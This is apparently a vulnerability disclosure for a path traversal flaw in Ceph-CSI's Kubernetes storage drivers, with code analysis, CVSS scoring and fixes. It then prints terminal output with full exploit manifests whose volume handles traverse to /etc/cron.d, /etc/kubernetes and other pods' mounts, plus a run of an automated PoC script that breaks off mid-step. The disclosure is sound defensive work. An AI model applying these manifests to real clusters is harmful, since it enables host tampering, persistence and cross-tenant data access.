
## Reporting a Vulnerability

# Security Vulnerability Disclosure: Ceph-CSI Path Traversal

**Report Date:** January 17, 2026
**Researcher:** Shaul Ben Hai (shaulbh86@gmail.com)
**Severity:** HIGH to CRITICAL (CVSS 3.1: 7.5 - 9.1 depending on deployment)
**CVE:** Pending Assignment
**Affected Product:** Ceph-CSI (RBD and CephFS drivers)
**Repository:** https://github.com/ceph/ceph-csi

---

## Executive Summary

A path traversal vulnerability has been identified in Ceph-CSI, the official Ceph Container Storage Interface driver for Kubernetes. This vulnerability affects both the RBD (RADOS Block Device) and CephFS drivers. The flaw allows an attacker with permissions to create PersistentVolume objects to escape intended directory boundaries and perform unauthorized file system operations on cluster nodes.

**This vulnerability is part of a class of CSI driver vulnerabilities previously identified in:**
- kubernetes-csi/csi-driver-nfs
- kubernetes-csi/csi-driver-smb
- democratic-csi

**Impact varies by deployment configuration:**

| Configuration | Impact | Severity |
|---------------|--------|----------|
| **Default deployment** | Cross-pod data access/deletion within `/var/lib/kubelet/plugins` | HIGH (CVSS 7.5) |
| **Production with host root mount** | Full host filesystem access, container escape | CRITICAL (CVSS 9.1) |

The root cause is insufficient input validation when processing the `volumeId` parameter in path construction functions. The vulnerable code uses direct string concatenation (`+ "/" +`) without any sanitization, allowing path traversal sequences like `../../../` to escape the intended staging directory.

---

## Affected Versions & Components

| Component | Affected Versions | Repository |
|-----------|-------------------|------------|
| Ceph-CSI RBD Driver | All versions through latest | github.com/ceph/ceph-csi |
| Ceph-CSI CephFS Driver | All versions through latest | github.com/ceph/ceph-csi |

**Affected Kubernetes Versions:**
- Kubernetes v1.20+ (CSI GA)
- All major managed Kubernetes platforms (GKE, EKS, AKS, OpenShift)

---

## Vulnerable Code Locations

### RBD Driver (internal/rbd/nodeserver.go)

#### Location 1: getStagingTargetPath() - Lines 1016-1027

```go
func getStagingTargetPath(req interface{}) string {
    switch vr := req.(type) {
    case *csi.NodeStageVolumeRequest:
        return vr.GetStagingTargetPath() + "/" + vr.GetVolumeId()  // NO SANITIZATION
    case *csi.NodeUnstageVolumeRequest:
        return vr.GetStagingTargetPath() + "/" + vr.GetVolumeId()  // NO SANITIZATION
    }
    return ""
}
```

**Why This Is Vulnerable:**
- `GetVolumeId()` returns user-controlled data from the PersistentVolume spec
- Direct string concatenation with "/" allows path traversal
- No validation that volumeId is a simple identifier (not a path)

#### Location 2: NodeStageVolume - Line 371

```go
stagingTargetPath := stagingParentPath + "/" + volID
```

**Attack Flow:**
1. Attacker creates PV with `volumeHandle: "0001-0024-rook-ceph-0000000000000001-00000000-0000-0000-0000-000000000001/../../../etc/cron.d"`
2. When NodeStageVolume is called, `volID` contains the malicious path
3. `stagingTargetPath` becomes `/var/lib/kubelet/plugins/kubernetes.io/csi/pv/xxx/globalmount/../../../etc/cron.d`
4. Path normalizes to `/etc/cron.d`

#### Location 3: NodePublishVolume - Lines 835-843

```go
stagingPath := req.GetStagingTargetPath()
volID := req.GetVolumeId()
stagingPath += "/" + volID  // PATH TRAVERSAL POSSIBLE
```

#### Location 4: NodeExpandVolume - Lines 1304-1305

```go
volumePath += "/" + volumeID
```

### CephFS Driver (internal/cephfs/nodeserver.go)

The CephFS driver has similar patterns where volumeId and snapshot identifiers are concatenated into paths without validation:

```go
absoluteSnapshotRoot := path.Join(stagingTargetPath, snapshotRoot)
```

While `path.Join()` is used here, snapshot directory names derived from user-controlled `BackingSnapshotID` could contain traversal sequences.

---

## Technical Analysis

### Why String Concatenation Is Dangerous

```go
// The vulnerable pattern in Ceph-CSI:
stagingPath := "/var/lib/kubelet/plugins/kubernetes.io/csi/pv/test/globalmount"
volumeID := "legit-id/../../../etc/cron.d"
result := stagingPath + "/" + volumeID
// Result: "/var/lib/kubelet/plugins/kubernetes.io/csi/pv/test/globalmount/legit-id/../../../etc/cron.d"
// After path resolution: "/etc/cron.d"
```

### Why filepath.Clean/filepath.Join Don't Help

```go
// These normalize but DON'T prevent traversal:
filepath.Join("/base/path", "../../../etc") == "/etc"
filepath.Clean("/base/path/../../../etc") == "/etc"
```

### Ceph-CSI VolumeID Format

Ceph-CSI uses structured volumeIDs with the following format:
```
<csi_id_version>-<cluster_id>-<pool_id>-<volume_uuid>
```

Example: `0001-0024-rook-ceph-0000000000000001-00000000-0000-0000-0000-000000000001`

**However, the code does not validate this format before path concatenation.** An attacker can supply arbitrary strings including path traversal sequences.

---

## Attack Scenarios

### Scenario 1: RBD Volume Path Traversal (NodeStageVolume)

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
  name: malicious-rbd-pv
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteOnce
  persistentVolumeReclaimPolicy: Delete
  csi:
    driver: rbd.csi.ceph.com
    # Malicious volumeHandle with path traversal
    volumeHandle: "0001-0024-cluster/../../../tmp/pwned"
    nodeStageSecretRef:
      name: ceph-secret
      namespace: default
    volumeAttributes:
      clusterID: "rook-ceph"
      pool: "replicapool"
      imageFeatures: "layering"
```

### Scenario 2: CephFS Volume Path Traversal

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
  name: malicious-cephfs-pv
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteMany
  persistentVolumeReclaimPolicy: Delete
  csi:
    driver: cephfs.csi.ceph.com
    volumeHandle: "0001-0024-cephfs/../../../var/log"
    nodeStageSecretRef:
      name: ceph-secret
      namespace: default
    volumeAttributes:
      clusterID: "rook-ceph"
      fsName: "myfs"
      subvolumePath: "/volumes/csi"
```

### Scenario 3: NodeExpandVolume Attack

When expanding a volume, the volumeID is similarly concatenated:

```go
volumePath += "/" + volumeID
```

An attacker could:
1. Create a PV with malicious volumeID
2. Trigger volume expansion
3. The expand operation operates on the traversed path

---

## Impact Matrix

| Attack Target | Operation | Impact | Severity |
|---------------|-----------|--------|----------|
| `/etc/cron.d` | Mount/Stage | Write malicious cron jobs | Critical |
| `/etc/kubernetes/pki` | Unmount/Delete | Node certificate destruction | Critical |
| `/var/lib/kubelet` | Any | Node becomes unusable | Critical |
| `/var/lib/etcd` | Write | Cluster database corruption | Critical |
| `/root/.ssh` | Write | Backdoor SSH access | Critical |
| `/etc/systemd/system` | Write | Persistent malware | Critical |

### Blast Radius

- **Single Node:** Direct impact on nodes where malicious volume is staged
- **Cluster-Wide:** If targeting shared paths or triggering on all nodes
- **Multi-Tenant:** In shared clusters, one tenant can impact others' data

---

## Proof of Concept

### Prerequisites

- Kubernetes cluster with Ceph-CSI deployed (Rook-Ceph or standalone)
- Permissions to create PersistentVolume objects
- kubectl access

### POC Files Provided

| File | Description |
|------|-------------|
| `exploit_rbd_path_traversal.yaml` | RBD driver exploit manifests |
| `exploit_cephfs_path_traversal.yaml` | CephFS driver exploit manifests |
| `POC_CEPH_CSI.sh` | Automated exploitation script |
| `VULNERABILITY_ANALYSIS.md` | Detailed code analysis |

### Manual Verification Steps

```bash
# 1. Verify Ceph-CSI is installed
kubectl get csidriver rbd.csi.ceph.com
kubectl get csidriver cephfs.csi.ceph.com

# 2. Apply malicious PV (see exploit manifests)
kubectl apply -f exploit_rbd_path_traversal.yaml

# 3. Create PVC to bind
kubectl apply -f malicious-pvc.yaml

# 4. Check CSI node plugin logs for path construction
kubectl logs -n rook-ceph -l app=csi-rbdplugin -c csi-rbdplugin | grep -i "staging"

# 5. Verify path traversal occurred
# Look for operations on unexpected paths
```

---

## CVSS Score Calculation

### Default Deployment (No Host Root Mount)

**CVSS 3.1 Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H
**Score:** 7.5 (HIGH)

- Attack Vector: Network (via Kubernetes API)
- Attack Complexity: Low (simple PV creation)
- Privileges Required: Low (PV creation permission)
- Scope: Unchanged (within CSI namespace)
- Confidentiality: None (primarily write operations)
- Integrity: High (arbitrary path operations)
- Availability: High (can delete critical paths)

### With Host Root Mount

**CVSS 3.1 Vector:** AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
**Score:** 9.1 (CRITICAL)

- Scope: Changed (escapes container)
- All CIA impacts: High (full host access)

---

## Recommended Fixes

### Immediate Mitigation (Operators)

1. **Restrict PV Creation Permissions**
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: restricted-pv-access
rules:
- apiGroups: [""]
  resources: ["persistentvolumes"]
  verbs: ["get", "list"]
  # Remove "create" and "update" for untrusted users
```

2. **Admission Webhook Validation**
```yaml
# Block PVs with suspicious volumeHandle patterns
# Reject any volumeHandle containing ".."
```

3. **Network Policies**
Restrict which namespaces can interact with Ceph storage.

### Code Fix (Maintainers)

#### Option 1: Input Validation

```go
func validateVolumeID(volID string) error {
    // Reject path traversal sequences
    if strings.Contains(volID, "..") {
        return fmt.Errorf("volumeID contains invalid path traversal sequence: %s", volID)
    }

    // Reject path separators
    if strings.ContainsAny(volID, "/\\") {
        return fmt.Errorf("volumeID contains invalid path characters: %s", volID)
    }

    // Validate against expected format
    if !isValidCephVolumeID(volID) {
        return fmt.Errorf("volumeID does not match expected format: %s", volID)
    }

    return nil
}
```

#### Option 2: Secure Path Joining

```go
import "github.com/cyphar/filepath-securejoin"

func getStagingTargetPath(req interface{}) (string, error) {
    switch vr := req.(type) {
    case *csi.NodeStageVolumeRequest:
        return securejoin.SecureJoin(vr.GetStagingTargetPath(), vr.GetVolumeId())
    case *csi.NodeUnstageVolumeRequest:
        return securejoin.SecureJoin(vr.GetStagingTargetPath(), vr.GetVolumeId())
    }
    return "", errors.New("unknown request type")
}
```

#### Option 3: Path Boundary Check

```go
func getStagingTargetPath(req interface{}) (string, error) {
    var basePath, volID string

    switch vr := req.(type) {
    case *csi.NodeStageVolumeRequest:
        basePath = vr.GetStagingTargetPath()
        volID = vr.GetVolumeId()
    case *csi.NodeUnstageVolumeRequest:
        basePath = vr.GetStagingTargetPath()
        volID = vr.GetVolumeId()
    default:
        return "", errors.New("unknown request type")
    }

    // Construct path
    fullPath := filepath.Join(basePath, volID)

    // Verify path stays within base
    absBase, _ := filepath.Abs(basePath)
    absFull, _ := filepath.Abs(fullPath)

    if !strings.HasPrefix(absFull, absBase) {
        return "", fmt.Errorf("path traversal detected: %s escapes %s", volID, basePath)
    }

    return fullPath, nil
}
```

---

## Related Vulnerabilities

This vulnerability is part of a broader class of CSI driver path traversal issues:

| CVE | Driver | Status |
|-----|--------|--------|
| Pending | csi-driver-nfs | Reported 2026-01-14 |
| Pending | csi-driver-smb | Reported 2026-01-15 |
| Pending | democratic-csi | Reported 2026-01-16 |
| **This Report** | **Ceph-CSI** | **Reported 2026-01-17** |

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-01-17 | Vulnerability discovered in Ceph-CSI |
| 2026-01-17 | Initial analysis and POC development |
| TBD | Report submitted to Ceph security team |
| TBD | Report submitted to Kubernetes HackerOne |
| TBD | CVE assignment |
| TBD + 90 days | Public disclosure (coordinated) |

---

## Contact Information

**Researcher:** Shaul Ben Hai
**Email:** shaulbh86@gmail.com
**Submission Platform:** Kubernetes HackerOne Bug Bounty

---

## Files & Evidence

| File | Description |
|------|-------------|
| `SECURITY_DISCLOSURE_CEPH_CSI.md` | This disclosure document |
| `exploit_rbd_path_traversal.yaml` | RBD driver exploit manifests |
| `exploit_cephfs_path_traversal.yaml` | CephFS driver exploit manifests |
| `POC_CEPH_CSI.sh` | Automated exploitation script |
| `VULNERABILITY_ANALYSIS.md` | Detailed technical analysis |

---

## Conclusion

Ceph-CSI contains critical path traversal vulnerabilities in both its RBD and CephFS drivers. The vulnerable code concatenates user-controlled volumeID values into filesystem paths without any validation, allowing attackers to escape the intended staging directories and operate on arbitrary host filesystem locations.

**Immediate action recommended:**
1. Apply RBAC restrictions to limit PV creation to trusted administrators
2. Deploy admission webhooks to reject malicious volumeHandle patterns
3. Monitor CSI driver logs for suspicious path operations
4. Update to patched versions when available

This vulnerability poses significant risk to multi-tenant Kubernetes environments using Ceph storage, as it enables privilege escalation from "PV creator" to "host filesystem access."


➜  ceph-csi cat exploit_cephfs_path_traversal.yaml
# Ceph-CSI CephFS Driver Path Traversal PoC
#
# VULNERABILITY: Path traversal in CephFS nodeserver functions
# AFFECTED: internal/cephfs/nodeserver.go
#
# The CephFS driver has similar vulnerable patterns where volumeId
# and snapshot identifiers are concatenated into paths without validation.
#
# USAGE:
#   1. Ensure Ceph-CSI CephFS driver is deployed
#   2. kubectl apply -f exploit_cephfs_path_traversal.yaml
#   3. Create a pod using the PVC to trigger NodeStageVolume
#   4. Check CSI node plugin logs for evidence of path traversal
#
# NOTE: CephFS uses different path construction but the same lack of validation

---
# Scenario 1: Basic CephFS Path Traversal
#
# The volumeHandle with traversal sequences
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-fs-traversal-poc-1
  labels:
    exploit: path-traversal
    driver: cephfs.csi.ceph.com
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteMany
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: cephfs.csi.ceph.com
    # MALICIOUS VOLUMEHANDLE - Contains path traversal
    volumeHandle: "0001-0024-cephfs-subvol/../../../tmp/cephfs-pwned"
    nodeStageSecretRef:
      name: rook-csi-cephfs-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      fsName: "myfs"
      subvolumePath: "/volumes/csi"
      subvolumeGroup: "csi"

---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: ceph-fs-traversal-pvc-1
  namespace: default
spec:
  volumeName: ceph-fs-traversal-poc-1
  accessModes:
    - ReadWriteMany
  resources:
    requests:
      storage: 1Gi
  storageClassName: ""

---
# Scenario 2: Snapshot Root Path Traversal
#
# CephFS snapshots use snapshotRoot which could be vulnerable:
#   absoluteSnapshotRoot := path.Join(stagingTargetPath, snapshotRoot)
#
# If BackingSnapshotID contains traversal, snapshotRoot could escape
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-fs-snapshot-traversal
  labels:
    exploit: path-traversal
    driver: cephfs.csi.ceph.com
    attack-vector: snapshot
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteMany
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: cephfs.csi.ceph.com
    # Volume with snapshot that contains traversal
    volumeHandle: "0001-fs-snap/../../../var/log/cephfs-snapshot-attack"
    nodeStageSecretRef:
      name: rook-csi-cephfs-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      fsName: "myfs"
      subvolumePath: "/volumes/csi/subvol-xxx"
      # BackingSnapshotID could be leveraged for traversal
      backingSnapshotID: "snap-id/../../../etc"

---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: ceph-fs-snapshot-pvc
  namespace: default
spec:
  volumeName: ceph-fs-snapshot-traversal
  accessModes:
    - ReadWriteMany
  resources:
    requests:
      storage: 1Gi
  storageClassName: ""

---
# Scenario 3: Target /var/lib/kubelet
#
# Could disrupt kubelet operations
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-fs-traversal-kubelet
  labels:
    exploit: path-traversal
    driver: cephfs.csi.ceph.com
    target: kubelet
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteMany
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: cephfs.csi.ceph.com
    # Traversal to kubelet directory
    volumeHandle: "0001-cephfs/../../../var/lib/kubelet/pods/rogue-mount"
    nodeStageSecretRef:
      name: rook-csi-cephfs-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      fsName: "myfs"
      subvolumePath: "/volumes/csi"

---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: ceph-fs-kubelet-pvc
  namespace: default
spec:
  volumeName: ceph-fs-traversal-kubelet
  accessModes:
    - ReadWriteMany
  resources:
    requests:
      storage: 1Gi
  storageClassName: ""

---
# Scenario 4: Cross-pod data access
#
# Traverse to another pod's volume mount
# This demonstrates the multi-tenant risk
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-fs-cross-pod-traversal
  labels:
    exploit: path-traversal
    driver: cephfs.csi.ceph.com
    attack-type: cross-pod
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteMany
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: cephfs.csi.ceph.com
    # Traversal to sibling pod's volume
    volumeHandle: "vol-id/../../../pods/victim-pod-uuid/volumes/kubernetes.io~csi/victim-pv/mount"
    nodeStageSecretRef:
      name: rook-csi-cephfs-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      fsName: "myfs"
      subvolumePath: "/volumes/csi"

---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: ceph-fs-cross-pod-pvc
  namespace: default
spec:
  volumeName: ceph-fs-cross-pod-traversal
  accessModes:
    - ReadWriteMany
  resources:
    requests:
      storage: 1Gi
  storageClassName: ""

---
# Scenario 5: Subvolume Path Injection
#
# The subvolumePath attribute might also be vulnerable
# if it's used in path construction without validation
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-fs-subvol-traversal
  labels:
    exploit: path-traversal
    driver: cephfs.csi.ceph.com
    attack-vector: subvolumePath
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteMany
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: cephfs.csi.ceph.com
    volumeHandle: "0001-cephfs-legitimate-id"
    nodeStageSecretRef:
      name: rook-csi-cephfs-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      fsName: "myfs"
      # MALICIOUS subvolumePath - if used in path construction
      subvolumePath: "/volumes/csi/legit/../../../tmp/subvol-pwned"
      subvolumeGroup: "csi"

---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: ceph-fs-subvol-pvc
  namespace: default
spec:
  volumeName: ceph-fs-subvol-traversal
  accessModes:
    - ReadWriteMany
  resources:
    requests:
      storage: 1Gi
  storageClassName: ""

---
# Scenario 6: CRITICAL - Target /etc/kubernetes
#
# WARNING: EXTREMELY DANGEROUS - Only for controlled test environments
# This could compromise Kubernetes certificates and configs
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-fs-traversal-critical
  labels:
    exploit: path-traversal
    driver: cephfs.csi.ceph.com
    target: etc-kubernetes
    severity: critical
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteMany
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: cephfs.csi.ceph.com
    # CRITICAL: Traversal to /etc/kubernetes
    volumeHandle: "0001-cephfs/../../../etc/kubernetes"
    nodeStageSecretRef:
      name: rook-csi-cephfs-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      fsName: "myfs"
      subvolumePath: "/volumes/csi"

---
# Test Pod for CephFS - Triggers CSI operations
#
apiVersion: v1
kind: Pod
metadata:
  name: ceph-fs-traversal-test-pod
  namespace: default
spec:
  containers:
  - name: test
    image: busybox:latest
    command: ["sh", "-c", "echo 'CephFS test pod running'; ls -la /mnt/test 2>/dev/null || true; sleep 3600"]
    volumeMounts:
    - name: test-vol
      mountPath: /mnt/test
  volumes:
  - name: test-vol
    persistentVolumeClaim:
      claimName: ceph-fs-traversal-pvc-1
  tolerations:
  - key: "node.kubernetes.io/not-ready"
    operator: "Exists"
    effect: "NoSchedule"
➜  ceph-csi



  ceph-csi cat exploit_rbd_path_traversal.yaml
# Ceph-CSI RBD Driver Path Traversal PoC
#
# VULNERABILITY: Path traversal in getStagingTargetPath() and related functions
# AFFECTED: internal/rbd/nodeserver.go - lines 371, 835-843, 1016-1027, 1304-1305
#
# The vulnerable code:
#   return vr.GetStagingTargetPath() + "/" + vr.GetVolumeId()
#
# USAGE:
#   1. Ensure Ceph-CSI is deployed (Rook-Ceph or standalone)
#   2. kubectl apply -f exploit_rbd_path_traversal.yaml
#   3. Create a pod using the PVC to trigger NodeStageVolume
#   4. Check CSI node plugin logs for evidence of path traversal
#
# DANGER: These manifests demonstrate the vulnerability. Modify paths carefully.
#
# NOTE: For testing, we use paths that won't cause system damage but prove the concept.
#       Real exploitation could target /etc/cron.d, /var/lib/kubelet, etc.

---
# Scenario 1: Basic Path Traversal - Escape to /tmp
#
# The volumeHandle contains: legit-vol-id/../../../tmp/ceph-csi-pwned
# When concatenated: /var/lib/kubelet/plugins/.../globalmount/legit-vol-id/../../../tmp/ceph-csi-pwned
# Normalizes to: /tmp/ceph-csi-pwned
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-rbd-traversal-poc-1
  labels:
    exploit: path-traversal
    driver: rbd.csi.ceph.com
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteOnce
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: rbd.csi.ceph.com
    # MALICIOUS VOLUMEHANDLE - Contains path traversal
    # Format looks like valid Ceph ID but contains traversal
    volumeHandle: "0001-0024-rook-ceph-pool/../../../tmp/ceph-csi-pwned-rbd"
    nodeStageSecretRef:
      name: rook-csi-rbd-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      pool: "replicapool"
      imageFeatures: "layering"

---
# PVC to bind to malicious PV
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: ceph-rbd-traversal-pvc-1
  namespace: default
spec:
  volumeName: ceph-rbd-traversal-poc-1
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
  storageClassName: ""

---
# Scenario 2: Target /var/log for write operations
#
# This could allow writing to system logs or filling disk
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-rbd-traversal-poc-2
  labels:
    exploit: path-traversal
    driver: rbd.csi.ceph.com
    target: var-log
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteOnce
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: rbd.csi.ceph.com
    # Traversal to /var/log
    volumeHandle: "0001-0024-legit/../../../var/log/ceph-exploit"
    nodeStageSecretRef:
      name: rook-csi-rbd-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      pool: "replicapool"
      imageFeatures: "layering"

---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: ceph-rbd-traversal-pvc-2
  namespace: default
spec:
  volumeName: ceph-rbd-traversal-poc-2
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
  storageClassName: ""

---
# Scenario 3: Target kubelet plugins directory
#
# Could interfere with other CSI drivers or kubelet operations
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-rbd-traversal-poc-3
  labels:
    exploit: path-traversal
    driver: rbd.csi.ceph.com
    target: kubelet-plugins
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteOnce
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: rbd.csi.ceph.com
    # Traversal to sibling plugin directory
    volumeHandle: "vol-id/../../../plugins/kubernetes.io/csi/pv/other-pv/mount"
    nodeStageSecretRef:
      name: rook-csi-rbd-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      pool: "replicapool"
      imageFeatures: "layering"

---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: ceph-rbd-traversal-pvc-3
  namespace: default
spec:
  volumeName: ceph-rbd-traversal-poc-3
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
  storageClassName: ""

---
# Scenario 4: Critical Path - Target /etc/cron.d (DANGEROUS)
#
# WARNING: This could cause system damage. Only use in test environments.
# Writing to /etc/cron.d could enable persistent code execution.
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-rbd-traversal-poc-critical
  labels:
    exploit: path-traversal
    driver: rbd.csi.ceph.com
    target: etc-crond
    severity: critical
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteOnce
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: rbd.csi.ceph.com
    # CRITICAL: Traversal to /etc/cron.d
    volumeHandle: "0001-rbd/../../../etc/cron.d"
    nodeStageSecretRef:
      name: rook-csi-rbd-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      pool: "replicapool"
      imageFeatures: "layering"

---
# Scenario 5: Deep traversal with legitimate-looking prefix
#
# Uses a more realistic looking volume ID with embedded traversal
#
apiVersion: v1
kind: PersistentVolume
metadata:
  name: ceph-rbd-traversal-poc-stealth
  labels:
    exploit: path-traversal
    driver: rbd.csi.ceph.com
    technique: obfuscated
spec:
  capacity:
    storage: 1Gi
  accessModes:
    - ReadWriteOnce
  persistentVolumeReclaimPolicy: Delete
  storageClassName: ""
  csi:
    driver: rbd.csi.ceph.com
    # Obfuscated traversal - looks more legitimate
    volumeHandle: "0001-0024-rook-ceph-0000000000000001-00000000-0000-0000-0000-000000000001/subvol/data/../../../../../../tmp/stealth-pwned"
    nodeStageSecretRef:
      name: rook-csi-rbd-node
      namespace: rook-ceph
    volumeAttributes:
      clusterID: "rook-ceph"
      pool: "replicapool"
      imageFeatures: "layering"

---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: ceph-rbd-traversal-pvc-stealth
  namespace: default
spec:
  volumeName: ceph-rbd-traversal-poc-stealth
  accessModes:
    - ReadWriteOnce
  resources:
    requests:
      storage: 1Gi
  storageClassName: ""

---
# Test Pod - Triggers NodeStageVolume and NodePublishVolume
#
# When this pod is scheduled, it will:
# 1. Call NodeStageVolume with the malicious volumeHandle
# 2. The path traversal in volumeHandle escapes staging directory
# 3. Check CSI logs for evidence
#
apiVersion: v1
kind: Pod
metadata:
  name: ceph-rbd-traversal-test-pod
  namespace: default
spec:
  containers:
  - name: test
    image: busybox:latest
    command: ["sh", "-c", "echo 'Pod running - check CSI logs for path traversal'; sleep 3600"]
    volumeMounts:
    - name: test-vol
      mountPath: /mnt/test
  volumes:
  - name: test-vol
    persistentVolumeClaim:
      claimName: ceph-rbd-traversal-pvc-1
  # Allow scheduling even without valid Ceph backend
  tolerations:
  - key: "node.kubernetes.io/not-ready"
    operator: "Exists"
    effect: "NoSchedule"
➜  ceph-csi



➜  ceph-csi ./POC_CEPH_CSI.sh

================================================================================
   Ceph-CSI Path Traversal Vulnerability PoC
   Affects: RBD and CephFS drivers
   Vulnerable Code: internal/rbd/nodeserver.go lines 371, 835-843, 1016-1027
================================================================================

[*] Checking prerequisites...
[+] Connected to cluster: gke_gcp-s1-dev-attackpaths-lz_us-central1_gke-default-latest
[*] Checking for Ceph-CSI drivers...
[-] RBD CSI driver not found
[-] CephFS CSI driver not found
[!] No Ceph-CSI drivers installed.
[!] This PoC will create manifests to demonstrate the vulnerability pattern.
[!] For full exploitation, deploy Ceph-CSI first (e.g., via Rook-Ceph).
[STEP 1] Creating test namespace...

================================================================================
   Demonstrating Path Traversal Vulnerability Pattern
================================================================================

The vulnerable code in internal/rbd/nodeserver.go:

func getStagingTargetPath(req interface{}) string {
    switch vr := req.(type) {
    case *csi.NodeStageVolumeRequest:
        return vr.GetStagingTargetPath() + "/" + vr.GetVolumeId()  // NO SANITIZATION
    case *csi.NodeUnstageVolumeRequest:
        return vr.GetStagingTargetPath() + "/" + vr.GetVolumeId()  // NO SANITIZATION
    }
    return ""
}

What happens with a malicious volumeId:

stagingPath = "/var/lib/kubelet/plugins/kubernetes.io/csi/pv/test/globalmount"
volumeId    = "legit-id/../../../tmp/pwned"

result = stagingPath + "/" + volumeId
       = "/var/lib/kubelet/plugins/kubernetes.io/csi/pv/test/globalmount/legit-id/../../../tmp/pwned"

After path normalization: /tmp/pwned


================================================================================
   Vulnerable Code Locations
================================================================================

File: internal/rbd/nodeserver.go

Line 371 (NodeStageVolume):
    stagingTargetPath := stagingParentPath + "/" + volID

Lines 835-843 (NodePublishVolume):
    stagingPath := req.GetStagingTargetPath()
    volID := req.GetVolumeId()
    stagingPath += "/" + volID

Lines 1016-1027 (getStagingTargetPath):
    return vr.GetStagingTargetPath() + "/" + vr.GetVolumeId()

Lines 1304-1305 (NodeExpandVolume):
    volumePath += "/" + volumeID

All these locations concatenate user-controlled volumeId without validation!

[STEP 2] Creating RBD exploit manifests...
persistentvolume "ceph-rbd-poc-pv" deleted

^Cpersistentvolumeclaim "ceph-rbd-poc-pvc" deleted
persistentvolume/ceph-rbd-poc-pv created
[+] Created malicious RBD PV with volumeHandle:
    0001-0024-rook-ceph-pool/../../../tmp/ceph-rbd-pwned
persistentvolumeclaim/ceph-rbd-poc-pvc created
[+] Created PVC bound to malicious PV
[STEP 3] Creating CephFS exploit manifests...
persistentvolume "ceph-fs-poc-pv" deleted
^Cpersistentvolumeclaim "ceph-fs-poc-pvc" deleted
persistentvolume/ceph-fs-poc-pv created
[+] Created malicious CephFS PV with volumeHandle:
    0001-cephfs-subvol/../../../tmp/ceph-fs-pwned
persistentvolumeclaim/ceph-fs-poc-pvc created
[+] Created PVC bound to malicious PV
[STEP 4] Checking CSI driver logs for evidence...
[*] Checking namespace: rook-ceph
[*] Checking namespace: ceph-csi-rbd
[*] Checking namespace: ceph-csi-cephfs
[*] Checking namespace: kube-system

================================================================================
   Manual Verification Steps
================================================================================

To verify the vulnerability:

1. Create a pod that uses the malicious PVC:

   kubectl run test-pod --image=busybox --restart=Never -n ceph-csi-poc \
     --overrides='{"spec":{"volumes":[{"name":"vol","persistentVolumeClaim":{"claimName":"ceph-rbd-poc-pvc"}}],"containers":[{"name":"test","image":"busybox","command":["sleep","3600"],"volumeMounts":[{"name":"vol","mountPath":"/mnt/test"}]}]}}'

2. Check CSI node plugin logs for the staging path:

